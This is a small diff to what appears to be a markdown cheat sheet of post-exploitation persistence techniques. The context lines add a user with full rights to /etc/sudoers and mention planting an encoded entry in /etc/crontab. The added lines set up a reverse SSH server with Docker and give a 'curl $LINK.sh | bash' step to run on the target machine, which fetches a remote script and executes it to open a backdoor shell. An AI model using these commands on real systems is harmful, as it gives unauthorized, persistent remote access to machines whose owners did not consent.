@@ -25,8 +25,12 @@ Encode with base 64 and add to /etc/crontab
 echo "$USERNAME ALL=(ALL:ALL) ALL" >> /etc/sudoers
 ```
 # [Reverse SSH](https://github.com/NHAS/reverse_ssh)
-```
+```bash
 docker run -p3232:2222 -e EXTERNAL_ADDRESS=10.8.85.10:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_rsa.pub)" -v data:/data reversessh/reverse_ssh
+```
+### Target Machine
+```
+curl $LINK.sh | bash
 ```
 
 # Find SUID
